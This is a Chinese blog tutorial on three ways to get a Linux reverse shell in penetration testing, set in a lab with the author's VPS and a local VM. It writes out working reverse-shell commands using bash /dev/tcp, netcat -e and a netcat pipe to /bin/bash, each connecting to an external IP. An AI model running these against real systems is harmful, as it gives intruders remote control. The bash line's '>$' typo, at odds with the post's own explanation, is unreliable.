---
title: Linux反弹shell的三种方法
date: 2018-11-06 11:55:30
tags: ['安全','反弹shell','netcat', '渗透测试']
categories: 安全
---

<div style="text-align: center;">
{% note success %} 
### 0x01 前言
{% endnote %}
</div>

在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？

而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。


<div style="text-align: center;">
{% note success %} 
### 0x02 获取shell
{% endnote %}
</div>

通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。

我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。

#### 通过bash反弹shell

第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令`nc -lvvp 7777`,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令`bash -i >$ /dev/tcp/130.211.244.96/7777 0>&1`。

`bash -i`的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，>&将标准错误输出重定向到标准输出中，0>&1将标准输入重定向到标准输出中。

下面来看一下具体的效果，先在攻击机器上监听端口：

{% asset_img 1攻击机监听端口.jpg %}

在受害机器上反弹shell：

{% asset_img 1受害机反弹shell.jpg%}

之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。

{% asset_img 1攻击机获得shell.jpg %}

#### 利用netcat反弹shell

如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。

同样，先在攻击机器上130.211.244.96开启监听端口`nc -lvvp 7777`，等待受害机器连接。

{% asset_img 1攻击机监听端口.jpg %}

在受害机器上执行命令`nc -e /bin/bash 130.211.244.96 7777`,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。

{% asset_img 2受害机反弹shell.jpg %}

{% asset_img 2攻击机获得shell.jpg %}


#### 利用管道反弹shell

netcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。

首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。

{% asset_img 3攻击机监听端口.jpg %}

然后在受害机器上执行命令`nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778`，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。

{% asset_img 3受害机反弹shell.jpg %}

这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。

{% asset_img 3攻击机获得shell.jpg %}


<br>

当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。


<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 信息流广告 -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-4127326375481893"
     data-ad-slot="9105526840"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>